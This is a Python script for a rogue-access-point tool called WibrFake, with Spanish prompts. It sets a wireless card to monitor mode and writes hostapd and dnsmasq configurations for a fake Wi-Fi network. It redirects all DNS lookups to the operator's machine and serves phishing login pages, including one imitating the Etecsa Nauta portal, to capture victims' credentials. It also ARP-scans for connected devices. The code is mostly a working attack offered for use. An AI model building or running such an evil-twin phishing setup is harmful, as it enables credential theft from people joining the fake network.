#!/bin/python3

import time 
import subprocess
import os
import scapy.all as scapy

#Colours
greenColour="\033[92m"
endColour="\033[0m\e[0m"
redColour="\033[91m"
blueColour="\033[94m"
yellowColour="\033[93m"
whiteColour="\033[97m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#print("hola ${grayColour} puta")
def banner():
    print(redColour)
    print("                       █     █░ ██▓ ▄▄▄▄    ██▀███    █████▒ ▄▄▄       ██ ▄█▀▓█████ ")
    print("                      ▓█░ █ ░█░▓██▒▓█████▄ ▓██ ▒ ██▒▓██   ▒ ▒████▄     ██▄█▒ ▓█   ▀ ")
    print("                      ▒█░ █ ░█ ▒██▒▒██▒ ▄██▓██ ░▄█ ▒▒████ ░ ▒██  ▀█▄  ▓███▄░ ▒███   ")
    print("                      ░█░ █ ░█ ░██░▒██░█▀  ▒██▀▀█▄  ░▓█▒  ░ ░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄ ")
    print("                      ░░██▒██▓ ░██░░▓█  ▀█▓░██▓ ▒██▒░▒█░     ▓█   ▓██▒▒██▒ █▄░▒████▒")
    print("                      ░ ▓░▒ ▒  ░▓  ░▒▓███▀▒░ ▒▓ ░▒▓░ ▒ ░     ▒▒   ▓▒█░▒ ▒▒ ▓▒░░ ▒░ ░")
    print("                        ▒ ░ ░   ▒ ░▒░▒   ░   ░▒ ░ ▒░ ░        ▒   ▒▒ ░░ ░▒ ▒░ ░ ░  ░")
    print("                        ░   ░   ▒ ░ ░    ░   ░░   ░  ░ ░      ░   ▒   ░ ░░ ░    ░   ")
    print("                          ░     ░   ░         ░                   ░  ░░  ░      ░  ░")
    print("                                         ░                                       By BreakerTW")
    print("                                                                                 https://github.com/BreakerTW/WibrFake")

def verifydepend():
    os.system("clear")
    banner()
    print()
    print()
    print()
    print()
    print(yellowColour, "(" + greenColour + "+" + yellowColour + ")", whiteColour, "Chequeando que esten instaladas todos los programas necesarios...")
    time.sleep(2.0)
    try:
        subprocess.check_output(["pip3", "show", "django"])
        print("\n" + greenColour + "     Django Installed")
    except subprocess.CalledProcessError:
        print("\n" + redColour + "   Dnsmasq Not Installed")
    try:
        time.sleep(2.0)
        subprocess.check_output(["pip3", "show", "scapy"])
        print("\n" + greenColour + "     Scapy Installed")
    except subprocess.CalledProcessError:
        time.sleep(2.0)
        print("\n" + redColour + "   Dnsmasq Not Installed")

    try:
        time.sleep(2.0)
        subprocess.check_output(["which", "hostapd"])
        print("\n" + greenColour + "     Hostapd Installed")
    except subprocess.CalledProcessError:
        time.sleep(2.0)
        print("\n" + redColour + "   Hostapd Not Installed")
    try:
        time.sleep(2.0)
        subprocess.check_output(["which", "dnsmasq"])
        print("\n" + greenColour + "     Dnsmasq Installed")
    except subprocess.CalledProcessError:
        time.sleep(2.0)
        print("\n" + redColour + "   Dnsmasq Not Installed")
    print("\n\n" + greenColour + "[" + yellowColour + "+" + greenColour + "]" + whiteColour + "Todas las dependencias instaladas")
    input("\n\nPresiona [Enter] para continuar")
    os.system("clear")

def  modemonitor(mode):
    print("\nActivando modo monitor...")
    try:
        initcommand = f"systemctl stop NetworkManager.service"
        subprocess.run(initcommand, shell=True)
        command = f"ifconfig {mode} down"
        subprocess.run(command, shell=True)
        command1 = f"iwconfig {mode} mode monitor"
        subprocess.run(command1, shell=True)
        command2 = f"ifconfig {mode} up"
        subprocess.run(command2, shell=True)
        endcommand = f"systemctl restart NetworkManager.service"
        subprocess.run(endcommand, shell=True)
        print("\nMode Monitor Enable...")
        input("Toque la tecla [Enter] para salir")
        inputbanner()
    except:
        return False
def modemanager(mode):
    print("\nDesactivando modo monitor...")
    try:
        command = f"ifconfig {mode} down"
        subprocess.run(command, shell=True)
        command1 = f"iwconfig {mode} mode manage"
        subprocess.run(command1, shell=True)
        command2 = f"ifconfig {mode} up"
        subprocess.run(command2, shell=True)
        endcommand = f"systemctl restart NetworkManager.service"
        subprocess.run(endcommand, shell=True)
        print("\nMode Monitor Disable...")
        input("Toque la tecla [Enter] para salir")
        inputbanner()
    except:
        return False
def initprogram():
    banner()
    verifydepend()
    inputbanner()
def inputbanner():
    os.system("clear")
    banner()
    print("\n")
    print(whiteColour + "1. Mode Monitor Enable")
    print(whiteColour + "\n2. Mode Monitor Disable")
    print("\n--------------------------------------------------------------------------------------------")
    print("\n\n")
    print(whiteColour + "3. Wifi AP Fake (Basic-Login)")
    print("\n" + whiteColour + "4. Wifi AP Fake (Nauta-Etecsa-Login)")
    print("\n" + whiteColour + "5. Wifi AP Fake (Plantilla Externa)")
    inpt = int(input("\nElige la opcion a ejecutar: "))
    if(inpt==1 or inpt==2):
        if(inpt==1):
            mode = input("\nInterfaz de red a operar [eje. wlan0]: ")
            print("\nProcesando...")
            time.sleep(2.0)
            modemonitor(mode)
        else:
           mode = input("\nInterfaz de red a operar [eje. wlan0]: ")
           print("\nProcesando...")
           time.sleep(2.0)
           modemanager(mode)
    elif(inpt==3):
        page = "basic-login"
        mode = input("\nInterfaz de red a operar [eje. wlan0]: ")
        print("\nProcesando...")
        time.sleep(2.0)
        name = getwibrdakedatename()
        chanel = getwibrdakedatechanel()
        password = getwibrdakedatepass()
        wibrfakeconfig()
        if(password=="no"):
            wibrfakefiles(mode, name, chanel)
        else:
            wibrfakefiles(mode, name, chanel, password)
        attackwibrfake(page)

    elif(inpt==4):
        page = "wifietecsa-login"
        mode = input("\nInterfaz de red a operar [eje. wlan0]: ")
        print("\nProcesando...")
        time.sleep(2.0)
        name = getwibrdakedatename()
        chanel = getwibrdakedatechanel()
        password = getwibrdakedatepass()
        wibrfakeconfig()
        if(password=="no"):
            wibrfakefiles(mode, name, chanel)
        else:
            wibrfakefiles(mode, name, chanel, password)
        attackwibrfake(page)

    else:
        print("Entrada no encontrada")
        input("Precione [Enter] para continuar")
        inputbanner()

def getwibrdakedatepass():
    time.sleep(2.0)
    print("\n" + greenColour + "[" + yellowColour + "+" + greenColour + "]" + whiteColour + "Configurando Wifi AP Fake")
    time.sleep(2.0)
    passw = input("Desea el AP Fake con contrasena o sin contrasena [y/n]: ")
    if(passw=="y" or passw=="yes"):
        passwd = input("\nContasena que deseas asignar: ")
        return passwd
    elif(passw=="n" or passw=="no"):
        passwd = "no"
        return passwd
    else:
        print("\nOrden No Encontrada")
        getwibrdakedatepass()

def getwibrdakedatename():
    time.sleep(1.0)
    name = input("\nNombre del punto wifi falso [eje. WifiHome]: ")
    return name
def getwibrdakedatechanel():
    time.sleep(1.0)
    chanel = input("\nNumero del canal [1-20]: ")
    return chanel

def wibrfakefiles(mode, name, chanel, password="no"):
    if(password=="no"):
        hostapd = open("hostapd.conf", "w")
        hostapd.write("interface=" + mode)
        hostapd.write("\ndriver=nl80211")
        hostapd.write("\nssid=" + name)
        hostapd.write("\nhw_mode=g")
        hostapd.write("\nchannel=" + chanel)
        hostapd.write("\nmacaddr_acl=0")
        hostapd.write("\nignore_broadcast_ssid=0")
        hostapd.write("\nwpa=0")
        hostapd.write("\nauth_algs=1")
        hostapd.write("\nwmm_enabled=0")
        hostapd.close()

        dnsmasq = open("dnsmasq.conf", "w")
        dnsmasq.write("interface=" + mode)
        dnsmasq.write("\ndhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h")
        dnsmasq.write("\ndhcp-option=3,192.168.1.1")
        dnsmasq.write("\ndhcp-option=6,192.168.1.1")
        dnsmasq.write("\nserver=8.8.8.8")
        dnsmasq.write("\nserver=8.8.4.4")
        dnsmasq.write("\nlog-queries")
        dnsmasq.write("\nlog-dhcp")
        dnsmasq.write("\nlisten-address=127.0.0.1")
        dnsmasq.write("\naddress=/#/192.168.1.1")
        dnsmasq.close()
    else:
        hostapd = open("hostapd.conf", "w")
        hostapd.write("interface=" + mode)
        hostapd.write("\ndriver=nl80211")
        hostapd.write("\nssid=" + name)
        hostapd.write("\nhw_mode=g")
        hostapd.write("\nchannel=" + chanel)
        hostapd.write("\nmacaddr_acl=0")
        hostapd.write("\nignore_broadcast_ssid=0")
        hostapd.write("\nwpa=2")
        hostapd.write("\nwpa_passphrase=" + password)
        hostapd.write("\nwpa_key_mgmt=WPA-PSK")
        hostapd.write("\nwpa_pairwise=CCMP")
        hostapd.write("\nwpa_group_rekey=86400")
        hostapd.write("\nauth_algs=1")
        hostapd.write("\nieee80211n=1")
        hostapd.write("\nwmm_enabled=0")
        hostapd.close()

        dnsmasq = open("dnsmasq.conf", "w")
        dnsmasq.write("interface=" + mode)
        dnsmasq.write("\ndhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h")
        dnsmasq.write("\ndhcp-option=3,192.168.1.1")
        dnsmasq.write("\ndhcp-option=6,192.168.1.1")
        dnsmasq.write("\nserver=8.8.8.8")
        dnsmasq.write("\nserver=8.8.4.4")
        dnsmasq.write("\nlog-queries")
        dnsmasq.write("\nlog-dhcp")
        dnsmasq.write("\nlisten-address=127.0.0.1")
        dnsmasq.write("\naddress=/#/192.168.1.1")
        dnsmasq.close()
def wibrfakeconfig():
    pkill_hostapd = f"pkill hostapd"
    subprocess.run(pkill_hostapd, shell=True)
    pkill_dnsmasq = f"pkill dnsmasq"
    subprocess.run(pkill_dnsmasq, shell=True)
    ifconfig = f"ifconfig wlo1 up 192.168.1.1 netmask 255.255.255.0"
    subprocess.run(ifconfig, shell=True)
    route = f"route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1"
    subprocess.run(route, shell=True)

def wibrfakehostsactive():
    packet = scapy.ARP(pdst="192.168.1.0/24")
    packet_eth = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet_all = packet_eth/packet
    reply, replynt = scapy.srp(packet_all, timeout=1, verbose=0)
    hosts_active = []
    for reply_srp in reply:
        hosts_active.append({'ip': reply_srp[1].psrc, 'mac': reply_srp[1].hwsrc})
    return hosts_active

def wibrfakehostsactiveshow():
    print("\n\n\n")
    result_hosts = wibrfakehostsactive()
    print("Hosts Actives: ")
    for host in result_hosts:
        ccc = f"IP: {host['ip']}, MAC: {host['mac']}"
        print(ccc)

def attackwibrfake(page_dir):
    actv_dnsmasq = f"dnsmasq -C dnsmasq.conf"
    actv_hostapd = f"hostapd hostapd.conf > /dev/null 1>&1 &"
    #actv_page = f"python3", page_dir + "/manage.py", "runserver 0.0.0.0:80"
    subprocess.run(actv_dnsmasq, shell=True)
    subprocess.run(actv_hostapd, shell=True)
    subprocess.Popen(["python3", page_dir + "/manage.py", "runserver", "0.0.0.0:80"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    input("AP Fake activate...")
    #os.system("clear")
    #while True:
    #    banner()
    #    wibrfakehostsactiveshow()
    #    input("\nToque [Enter] para refrescar")
    #    os.system("clear")

initprogram()
